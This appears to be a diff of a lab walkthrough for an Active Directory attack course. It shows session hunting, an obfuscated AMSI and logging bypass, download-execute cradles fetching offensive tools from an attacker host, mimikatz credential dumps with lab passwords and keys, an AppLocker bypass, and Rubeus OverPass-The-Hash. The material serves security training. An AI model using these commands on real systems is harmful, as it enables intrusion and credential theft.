@@ -1,28 +1,44 @@
-# Learning Objective 07
+# Learning Objective 07 (Lateral Movement | PowerShell Remoting + Credential Extraction + OverPass-The-Hash)
 
 ## Tasks
 
-1. **Identify a machine in the target domain where a Domain Admin session is available**
-2. **Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on `dcorp-ci`**
-3. **Escalate privilege to DA by abusing derivative local admin through `dcorp-adminsrv`**. On `dcorp-adminsrv`, tackle application allow listing using:
-	- Gaps in Applocker rules
-	- Disable Applocker by modifying GPO applicable to `dcorp-adminsrv`
+1. **Lateral move to a machine with local admin privileges, extract the DA encryption key hash and escalate via OverPass-The-Hash (Pass-The-Key)**
+2. **Lateral move to a machine with local admin privileges and extract credentials from LSASS/Credential Vault by exploiting gaps in AppLocker GPO rules. Lateral move to another machine with local admin privileges and extract credentials from LSASS by disabling AppLocker**
+
+---
+
+## Attack Path Steps
+
+1. **Lateral move to a machine with local admin privileges, extract the DA encryption key hash and escalate via OverPass-The-Hash (Pass-The-Key)**
+	- **Find a Target Machine 1 `dcorp-mgmt` where a Domain Administrator has an Active Session**
+	- **Access to the Target Machine 1 `dcorp-mgmt` as a Local Administrator (for Lateral Movement)**
+	- **Extract the Encryption Key Hash (from the Target Machine 1 `dcorp-mgmt`) of the Target Domain Administrator**
+	- **Gain Access to the DC with DA Privileges using an OverPass-The-Hash Attack (for Lateral Movement)**
+2. **Lateral move to a machine with local admin privileges and extract credentials from LSASS/Credential Vault by exploiting gaps in AppLocker GPO rules. Lateral move to another machine with local admin privileges and extract credentials from LSASS by disabling AppLocker**
+	- **Find a Target Machine 2 `dcorp-adminsrv` where we have Local Administrator Privileges**
+	- **Access to the Target Machine 2 as a Local Administrator (for Lateral Movement)**
+	- **Extract Credentials from the LSASS Process Memory (of the Target Machine 2 `dcorp-adminsrv`) by Exploiting Gaps in AppLocker GPO Rules**
+	- **Extract Credentials from the Windows Credential Vault (of the Target Machine 2 `dcorp-adminsrv`) by Exploiting Gaps in AppLocker GPO Rules**
+	- **Use Lateral Movement to the Target Machine 1 `dcorp-mgmt` and Extract Credentials from its LSASS Process Memory**
+	- **Extract Credentials from the LSASS Process Memory (of the Target Machine 2 `dcorp-adminsrv`) Disabling AppLocker by Modifying the GPO**
 
 ---
 
 ## Solution
 
-1. **Identify a machine in the target domain where a Domain Admin session is available**
+1. **Lateral move to a machine with local admin privileges, extract the DA encryption key hash and escalate via OverPass-The-Hash (Pass-The-Key)**
+
+- **Find a Target Machine 1 `dcorp-mgmt` where a Domain Administrator has an Active Session**
 
 We have access to two domain users (`student422` and `ciadmin`) and administrative access to `dcorp-adminsrv` machine (see *Learning Objective 05*). User hunting has not been fruitful as `student422`.
 
 **Enumeration using Invoke-SessionHunter**
 
-We can use `Invoke-SessionHunter.ps1` from the student VM to list sessions on all the remote machines. The script connects to Remote Registry service on remote machines that runs by default. Also, admin access is not required on the remote machines.
+We can use `Invoke-SessionHunter.ps1` from the student VM to list sessions on all the remote machines.
 
-Use the following commands.
+**`Invoke-SessionHunter.ps1` queries the Remote Registry Service**, which runs by default on Windows machines, and does **not require administrative privileges**. This makes it a **low-privilege method** for identifying active user sessions without triggering security alerts.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `cd \AD\Tools`
 
@@ -64,7 +80,7 @@ dcorp-std434   dcorp\student434            False
 dcorp-stdadmin dcorp\studentadmin          False
 dcorp-dc       dcorp\Administrator         False
 dcorp-dc       dcorp\svcadmin              False
-dcorp-mgmt     dcorp\svcadmin              False📌
+dcorp-mgmt🖥️   dcorp\svcadmin👤            False📌
 dcorp-std426   DCORP-STD422\Administrator  False
 dcorp-stdadmin DCORP-STD422\Administrator  False
 dcorp-adminsrv dcorp\appadmin               True
@@ -72,9 +88,7 @@ dcorp-adminsrv dcorp\srvadmin               True
 dcorp-adminsrv dcorp\websvc                 True
 ```
 
-<🔄 Alternative Step🔄>
-
-To make the above enumeration **more OpSec friendly and avoid triggering tools like MDI**, we can query specific target machines. You need to create `servers.txt` to use the below command.
+To make the above enumeration **more OPSEC friendly and avoid triggering tools like MDI**, we can query specific target machines. You need to create `servers.txt` and use the below commands.
 
 `notepad C:\AD\Tools\servers.txt`:
 ```
@@ -94,32 +108,29 @@ HostName       UserSession     Access
 DCORP-APPSRV   dcorp\appadmin   False
 DCORP-MGMT     dcorp\mgmtadmin  False
 DCORP-MSSQL    dcorp\sqladmin   False
-DCORP-MGMT     dcorp\svcadmin   False📌
+DCORP-MGMT🖥️   dcorp\svcadmin👤 False📌
 DCORP-ADMINSRV dcorp\appadmin    True
 DCORP-ADMINSRV dcorp\srvadmin    True
 DCORP-ADMINSRV dcorp\websvc      True
 ```
 
-</🔄 Alternative Step🔄>
-
 Sweet! There is a domain admin (`svcadmin`) session on `dcorp-mgmt` server! We do not have access to the server but that comes later.
-🚩
-
-2. **Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on `dcorp-ci`**
 
 **Enumeration using PowerView**
 
-We got a reverse shell on `dcorp-ci` as `ciadmin` by abusing Jenkins (see *Learning Objective 05*).
+We got a reverse shell on `dcorp-ci` as a local administrator (`ciadmin`) by abusing Jenkins (see *Learning Objective 05*).
 
-We can use Powerview's `Find-DomainUserLocation` on the reverse shell to looks for machines where a domain admin is logged in.
+Unlike `Invoke-SessionHunter`, **`Find-DomainUserLocation` typically requires higher privileges**, as it performs more extensive queries against the domain. It leverages **Active Directory and remote system queries**, which may require administrative access or special permissions to retrieve session information.
 
-First, we must **bypass AMSI and enhanced logging**.
+So, before of using that, we must **bypass AMSI and enhanced logging**.
 
-First bypass Enhanced Script Block Logging so that the AMSI bypass is not logged. We could also use these bypasses in the initial `download-execute` cradle that we used in Jenkins.
+First **bypass Enhanced Script Block Logging so that the AMSI bypass is not logged**. We could also use these bypasses in the initial `download-execute` cradle that we used in Jenkins.
 
-The below command bypasses Enhanced Script Block Logging. Unfortunately, we have no in-memory bypass for PowerShell transcripts.
+Note: **PowerShell transcripts persist on disk, and there is no known in-memory technique to bypass their logging**.
 
-Note that we could also paste the contents of `sbloggingbypass.txt` in place of the `download-exec` cradle. Remember to host the `sbloggingbypass.txt` on a web server on the student VM if you use the `download-exec` cradle.
+Note that we could also paste the contents of `sbloggingbypass.txt` in place of the `download-exec` cradle.
+
+![dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)
 
 `type C:\AD\Tools\sbloggingbypass.txt`:
 ```powershell
@@ -128,11 +139,9 @@ Note that we could also paste the contents of `sbloggingbypass.txt` in place of 
 
 ![HFS - sbloggingbypass.txt](./assets/screenshots/learning_objective_07_hfs_sbloggingbypass.png)
 
-![Victim: dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)
-
 `iex (iwr http://172.16.100.22/sbloggingbypass.txt -UseBasicParsing)`
 
-Use the below command to bypass AMSI.
+Use the below command **to bypass AMSI**.
 
 ```powershell
 S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
@@ -143,6 +152,8 @@ Now, download and execute PowerView in memory of the reverse shell and run `Find
 ![HFS - PowerView.ps1](./assets/screenshots/learning_objective_07_hfs_powerview.png)
 
 `iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.22/PowerView.ps1'))`
+
+Use the following commands **to looks for machines where a domain admin is logged in**.
 
 Note: `Find-DomainUserLocation` may take many minutes to check all the machines in the domain.
 
@@ -158,26 +169,44 @@ LocalAdmin      :
 
 UserDomain      : dcorp
 UserName        : svcadmin👤
-ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local📌
-IPAddress       : 172.16.4.44
+ComputerName    : dcorp-mgmt🖥️.dollarcorp.moneycorp.local🏛️
+IPAddress       : 172.16.4.44📌
 SessionFrom     :
 SessionFromName :
 LocalAdmin      :
 ```
 
 Great! There is a domain admin session on `dcorp-mgmt` server!
+🚩
+
+- **Access to the Target Machine 1 `dcorp-mgmt` as a Local Administrator (for Lateral Movement)**
+
+To identify a machine in the domain where `ciadmin` has local administrative access, we can use `Find-PSRemotingLocalAdminAccess.ps1`.
+
+![HFS - Find-PSRemotingLocalAdminAccess.ps1](./assets/screenshots/learning_objective_07_hfs_findpsremotinglocaladminaccess.png)
+
+![dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)
+
+`iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.22/Find-PSRemotingLocalAdminAccess.ps1'))`
+
+`Find-PSRemotingLocalAdminAccess`:
+```
+dcorp-ci
+dcorp-mgmt🖥️
+```
+
+So, `ciadmin` has administrative access on `dcorp-mgmt`.
 
 Now, we can abuse this using winrs or PowerShell Remoting!
 
-**Use winrs to access dcorp-mgmt**
-
-Let’s check if we can execute commands on `dcorp-mgmt` server and if the winrm port is open.
-
 `winrs -r:dcorp-mgmt cmd /c "set computername && set username"`:
 ```
-COMPUTERNAME=DCORP-MGMT
-USERNAME=ciadmin
+COMPUTERNAME=DCORP-MGMT🖥️
+USERNAME=ciadmin👤
 ```
+🚩
+
+- **Extract the Encryption Key Hash (from the Target Machine 1 `dcorp-mgmt`) of the Target Domain Administrator**
 
 We would now run SafetyKatz on `dcorp-mgmt` to extract credentials from it. For that, we need to copy `Loader.exe` on `dcorp-mgmt`.
 Let's download `Loader.exe` on `dcorp-ci` and copy it from there to `dcorp-mgmt`. This is to avoid any downloading activity on `dcorp-mgmt`.
@@ -203,7 +232,7 @@ Using winrs, add the following port forwarding on `dcorp-mgmt` to avoid detectio
 
 Please note that we must use the `$null` variable to address output redirection issues.
 
-To run SafetyKatz on `dcorp-mgmt`, we will download and execute it in-memory using the Loader. Run the following command on the reverse shell.
+To run SafetyKatz on `dcorp-mgmt`, we will download and execute it in-memory using the Loader.
 
 ![HFS -SafetyKatz.exe](./assets/screenshots/learning_objective_07_hfs_safetykatz.png)
 
@@ -216,16 +245,16 @@ mimikatz(commandline) # sekurlsa::evasive-keys📌
 [SNIP]
 
 Authentication Id : 0 ; 58588 (00000000:0000e4dc)
-Session           : Service from 0
-User Name         : svcadmin👤
+Session📌         : Service from 0📌
+User Name         : svcadmin
 Domain            : dcorp
 Logon Server      : DCORP-DC
 Logon Time        : 1/16/2025 7:43:40 AM
 SID               : S-1-5-21-719815819-3726368948-3917688648-1118
 
-         * Username : svcadmin
+         * Username : svcadmin👤
          * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
-         * Password : *ThisisBlasphemyThisisMadness!!
+         * Password : *ThisisBlasphemyThisisMadness!!🔑
          * Key List :
            aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011🔑
            aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
@@ -238,18 +267,20 @@ SID               : S-1-5-21-719815819-3726368948-3917688648-1118
 [SNIP]
 ```
 
-Sweet! We got credentials of `svcadmin`, a domain administrator. Note that `svcadmin` is used as a service account (see  `Session` in the above output), so you can even get credentials in clear-text from lsasecrets!
+Sweet! We got credentials of `svcadmin`, a domain administrator.
+🚩
 
-**Use OverPass-the-Hash to replay `svcadmin` credentials**
+- **Gain Access to the DC with DA Privileges using an OverPass-The-Hash Attack (for Lateral Movement)**
 
-Finally, use OverPass-the-Hash to use `svcadmin`'s credentials.
+Note that `svcadmin` is used as a service account (see  `Session` in the above output), so you can even get credentials in clear-text from lsasecrets!
 
-Run the commands below **from an elevated shell** on the student VM to use Rubeus.
-Note that we can use whatever tool we want (Invoke-Mimi, SafetyKatz, Rubeus etc.).
+Now we can use OverPass-The-Hash (aka Pass-The-Key) to authenticate as `svcadmin` by replaying its credentials.
+
+Note that we can use whatever tool we want (Rubeus, Invoke-Mimi, SafetyKatz, etc.).
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
@@ -294,8 +325,6 @@ Note that we can use whatever tool we want (Invoke-Mimi, SafetyKatz, Rubeus etc.
   ASREP (key)              :  6366243A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011
 ```
 
-Try accessing the domain controller from the new spawned process!
-
 ![New spawned terminal process 1](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_1.png)
 
 `klist`:
@@ -316,23 +345,24 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-`winrs -r:dcorp-dc cmd /c set username`:
+Try accessing the domain controller from the new spawned process!
+
+`winrs -r:dcorp-dc cmd /c "set computername && set username"`:
 ```
-USERNAME=svcadmin
+COMPUTERNAME=DCORP-DC🖥️
+USERNAME=svcadmin👤
 ```
-🚩
 
 Note that we did not need to have direct access to `dcorp-mgmt` from the student VM.
+🚩
 
-3. **Escalate privilege to DA by abusing derivative local admin through `dcorp-adminsrv`**. On `dcorp-adminsrv`, tackle application allow listing using:
-	- Gaps in Applocker rules
-	- Disable Applocker by modifying GPO applicable to `dcorp-adminsrv`
+2. **Lateral move to a machine with local admin privileges and extract credentials from LSASS/Credential Vault by exploiting gaps in AppLocker GPO rules. Lateral move to another machine with local admin privileges and extract credentials from LSASS by disabling AppLocker**
 
-**Abuse Derivative Local Admin**
+Now moving on to the next task, we need to escalate to domain admin using derivative local admin.
 
-Now moving on to the next task, we need to escalate to domain admin using derivative local admin. Let’s find out the machines on which we have local admin privileges. On a PowerShell session started using Invisi-Shell, enter the following command.
+- **Find a Target Machine 2 `dcorp-adminsrv` where we have Local Administrator Privileges*
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -343,23 +373,15 @@ Now moving on to the next task, we need to escalate to domain admin using deriva
 
 `Find-PSRemotingLocalAdminAccess`:
 ```
-dcorp-adminsrv📌
+dcorp-adminsrv🖥️
 ```
 
 We have local admin on the `dcorp-adminsrv`.
+🚩
 
-You will notice that any attempt to run `Loader.exe` (to run SafetKatz from memory) results in error "This program is blocked by group policy. For more information, contact your system administrator".
-Any attempts to run Invoke-Mimi on `dcorp-adminsrv` results in errors about language mode.
+- **Access to the Target Machine 2 as a Local Administrator (for Lateral Movement)**
 
-This could be because of an application allowlist on `dcorp-adminsrv` and we drop into a Constrained Language Mode (CLM) when using PSRemoting.
-
-**Gaps in Applocker Policy**
-
-Let's check if Applocker is configured on `dcorp-adminsrv` by querying registry keys.
-
-Note that we are assuming that `reg.exe` is allowed to execute.
-
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `winrs -r:dcorp-adminsrv cmd`:
 ```
@@ -369,8 +391,20 @@ Microsoft Windows [Version 10.0.20348.2762]
 C:\Users\student422>
 ```
 🚀
+🚩
 
-![Victim: dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+- **Extract Credentials from the LSASS Process Memory (of the Target Machine 2 `dcorp-adminsrv`) by Exploiting Gaps in AppLocker GPO Rules**
+
+You will notice that any attempt to run `Loader.exe` (to run SafetyKatz from memory) results in error "This program is blocked by group policy. For more information, contact your system administrator".
+Any attempts to run Invoke-Mimi on `dcorp-adminsrv` results in errors about language mode.
+
+**This could be because of an application allowlist on `dcorp-adminsrv`** and we drop into a **Constrained Language Mode (CLM)** when using PSRemoting.
+
+Let's check if Applocker is configured on `dcorp-adminsrv` by querying registry keys.
+
+Note that we are assuming that `reg.exe` is allowed to execute.
+
+![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
 
 `reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2`:
 ```
@@ -382,21 +416,22 @@ HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script
 ```
 
 Looks like **Applocker is configured**.
-After going through the policies, we can understand that **Microsoft Signed binaries and scripts are allowed for all the users but nothing else**. However, this particular rule is overly permissive!
+
+After going through the policies, we can understand that **Microsoft signed binaries and scripts are allowed for all the users but nothing else**. However, this particular rule is overly permissive!
 
 `reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d`:
 ```
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
-    Value    REG_SZ    <FilePathRule Id="06dce67b-934c-454f-a263-2515c8796a5d" Name="(Default Rule) All scripts located in the Program Files folder" Description="Allows members of the Everyone group to run scripts that are located in the Program Files folder."📑 UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
+    Value    REG_SZ    <FilePathRule Id="06dce67b-934c-454f-a263-2515c8796a5d"📌 Name="(Default Rule) All scripts located in the Program Files folder" Description="Allows members of the Everyone group to run scripts that are located in the Program Files folder."📑 UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
 ```
 
-A default rule is enabled that allows everyone to run scripts from the `C:\ProgramFiles` folder!
+A default rule is enabled that allows everyone to run scripts from the `C:\Program Files` folder!
 
-We can also confirm this using PowerShell commands on `dcrop-adminsrv`. Run the below commands from a PowerShell session as `student422`.
+We can also confirm this using PowerShell commands on `dcrop-adminsrv`.
 
 `exit`
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `Enter-PSSession dcorp-adminsrv`:
 ```
@@ -404,11 +439,11 @@ We can also confirm this using PowerShell commands on `dcrop-adminsrv`. Run the 
 ```
 🚀
 
-![Victim: dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
 
 `$ExecutionContext.SessionState.LanguageMode`:
 ```
-ConstrainedLanguage
+ConstrainedLanguage📌
 ```
 
 `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`:
@@ -419,7 +454,7 @@ PathConditions      : {%PROGRAMFILES%\*}
 PathExceptions      : {}
 PublisherExceptions : {}
 HashExceptions      : {}
-Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
+Id                  : 06dce67b-934c-454f-a263-2515c8796a5d📌
 Name                : (Default Rule) All scripts located in the Program Files folder
 Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.📑
 UserOrGroupSid      : S-1-1-0
@@ -428,11 +463,11 @@ Action              : Allow
 [SNIP]
 ```
 
-Here, `Everyone` can run scripts from the `ProgramFiles` directory. That means, we can drop scripts in the `ProgramFiles` directory there and execute them.
+Here, `Everyone` can run scripts from the `Program Files` directory. That means, we can drop scripts in the `Program Files` directory there and execute them.
 
-Also, in the Constrained Language Mode, we cannot run scripts using dot sourcing (`. .\Invoke-Mimi.ps1`). So, we must modify `Invoke-Mimi.ps1` to include the function call in the script itself and transfer the modified script (`Invoke-MimiEx-keys-std422.ps1`) to the target server.
+Also, **in the Constrained Language Mode, we cannot run scripts using dot sourcing (`. .\Invoke-Mimi.ps1`)**.
 
-`exit`
+So, we must modify `Invoke-Mimi.ps1` to include the function call in the script itself and transfer the modified script (`Invoke-MimiEx-keys-std422.ps1`) to the target server.
 
 **Create `Invoke-MimiEx-keys-std422.ps1`**
 
@@ -463,9 +498,13 @@ Invoke-Mimi -Command $Pwn
 
 ![Invoke-MimiEx-keys-std422.ps1](./assets/screenshots/learning_objective_07_invokemimiexkeysstd422.png)
 
-On student machine run the following command from a PowerShell session. Note that it will take several minutes for the copy process to complete.
+On student machine run the following command from a PowerShell session.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+Note that it will take several minutes for the copy process to complete.
+
+`exit`
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -499,9 +538,11 @@ d-----          5/8/2021   8:27 AM                WindowsPowerShell
 ```
 🚀
 
-![Victim: dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
 
-Now, run the modified mimikatz script. Note that there is no dot sourcing here. It may take a couple of minutes for the script execution to complete.
+Now, run the modified Mimikatz script. Note that there is no dot sourcing here.
+
+It may take a couple of minutes for the script execution to complete.
 
 `C:\'Program Files'\Invoke-MimiEx-keys-std422.ps1`:
 ```
@@ -512,16 +553,16 @@ mimikatz(powershell) # sekurlsa::ekeys📌
 [SNIP]
 
 Authentication Id : 0 ; 136295 (00000000:00021467)
-Session           : Service from 0
-User Name         : appadmin👤
+Session           : Service from 0📌
+User Name         : appadmin
 Domain            : dcorp
 Logon Server      : DCORP-DC
 Logon Time        : 1/16/2025 7:43:13 AM
 SID               : S-1-5-21-719815819-3726368948-3917688648-1117
 
-         * Username : appadmin
+         * Username : appadmin👤
          * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
-         * Password : *ActuallyTheWebServer1
+         * Password : *ActuallyTheWebServer1🔑
          * Key List :
            aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb🔑
            aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e
@@ -534,14 +575,14 @@ SID               : S-1-5-21-719815819-3726368948-3917688648-1117
 [SNIP]
 
 Authentication Id : 0 ; 996 (00000000:000003e4)
-Session           : Service from 0
-User Name         : DCORP-ADMINSRV$👤
+Session           : Service from 0📌
+User Name         : DCORP-ADMINSRV$
 Domain            : dcorp
 Logon Server      : (null)
 Logon Time        : 1/16/2025 7:42:59 AM
 SID               : S-1-5-20
 
-         * Username : dcorp-adminsrv$
+         * Username : dcorp-adminsrv$👤
          * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
          * Password : (null)
          * Key List :
@@ -555,16 +596,16 @@ SID               : S-1-5-20
 [SNIP]
 
 Authentication Id : 0 ; 136296 (00000000:00021468)
-Session           : Service from 0
-User Name         : websvc👤
+Session           : Service from 0📌
+User Name         : websvc
 Domain            : dcorp
 Logon Server      : DCORP-DC
 Logon Time        : 1/16/2025 7:43:13 AM
 SID               : S-1-5-21-719815819-3726368948-3917688648-1114
 
-         * Username : websvc
+         * Username : websvc👤
          * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
-         * Password : AServicewhichIsNotM3@nttoBe
+         * Password : AServicewhichIsNotM3@nttoBe🔑
          * Key List :
            aes256_hmac       2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7🔑
            aes128_hmac       86a353c1ea16a87c39e2996253211e41
@@ -577,13 +618,17 @@ SID               : S-1-5-21-719815819-3726368948-3917688648-1114
 [SNIP]
 ```
 
-Here we find the credentials of the `dcorp-adminsrv$`, `appadmin` and `websvc` users.
+**By executing `sekurlsa::ekeys` in Mimikatz, we successfully dumped Kerberos encryption keys and credentials from LSASS memory**. This includes AES and RC4 keys for multiple accounts (`dcorp-adminsrv$`, `appadmin`, and `websvc`).
+🚩
 
-`exit`
+- **Extract Credentials from the Windows Credential Vault (of the Target Machine 2 `dcorp-adminsrv`) by Exploiting Gaps in AppLocker GPO Rules**
 
-**Create `Invoke-MimiEx-vault-stdx.ps1`**
+As we discussed in the class, there are other places to look for credentials.
 
-As we discussed in the class, there are other places to look for credentials. Let's modify `Invoke-Mimi.ps1` and look for credentials from the Windows Credential Vault.
+Let's modify `Invoke-Mimi.ps1` and **look for credentials from the Windows Credential Vault**.
+
+**Create `Invoke-MimiEx-vault-std422.ps1`**
+
 On the student VM:
 - Create a copy of `Invoke-Mimi.ps1` and rename it to `Invoke-MimiEx-vault-std422.ps1`.
 - Open `Invoke-MimiEx-vault-std422.ps1` in PowerShell ISE (right click on it and click `Edit`).
@@ -591,9 +636,13 @@ On the student VM:
 
 ![Invoke-MimiEx-vault-std422.ps1](./assets/screenshots/learning_objective_07_invokemimiexvaultstd422.png)
 
-Copy `Invoke-MimiEx-vault-std422.ps1` to `dcorp-adminsrv` and run it. Remember that it will take several minutes for the copy process to complete.
+Copy `Invoke-MimiEx-vault-std422.ps1` to `dcorp-adminsrv` and run it.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+Remember that it will take several minutes for the copy process to complete.
+
+`exit`
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -601,8 +650,6 @@ Copy `Invoke-MimiEx-vault-std422.ps1` to `dcorp-adminsrv` and run it. Remember t
 ```
 
 `Copy-Item C:\AD\Tools\Invoke-MimiEx-vault-std422.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'`
-
-Now, run the script. Again, it may take a couple of minutes for the script execution to complete.
 
 `dir \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'`:
 ```
@@ -628,7 +675,9 @@ d-----          5/8/2021   8:27 AM                WindowsPowerShell
 ```
 🚀
 
-![Victim: dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+
+Now, run the script. Again, it may take a couple of minutes for the script execution to complete.
 
 `C:\'Program Files'\Invoke-MimiEx-vault-std422.ps1`:
 ```
@@ -658,12 +707,15 @@ Attributes : 0
 ```
 
 Sweet! We got credentials for the `srvadmin` user in clear-text!
+🚩
 
-Start a cmd process using runas. Run the below command **from an elevated shell**.
+- **Use Lateral Movement to the Target Machine 1 `dcorp-mgmt` and Extract Credentials from its LSASS Process Memory**
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+Start a cmd process using runas.
 
 `runas /user:dcorp\srvadmin /netonly cmd`:
 ```
@@ -673,11 +725,27 @@ Attempting to start cmd as user "dcorp\srvadmin" ...
 
 ![New spawned terminal process 2](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_2.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
-The new process that starts has `srvadmin` privileges.
+The new spawned process has `srvadmin` privileges.
 
-Check if `srvadmin` has admin privileges on any other machine.
+`whoami`:
+```
+dcorp\student422
+```
+
+`hostname`:
+```
+dcorp-std422
+```
+
+`whoami /groups`:
+```
+ERROR: Unable to get group membership information.
+```
+❌
+
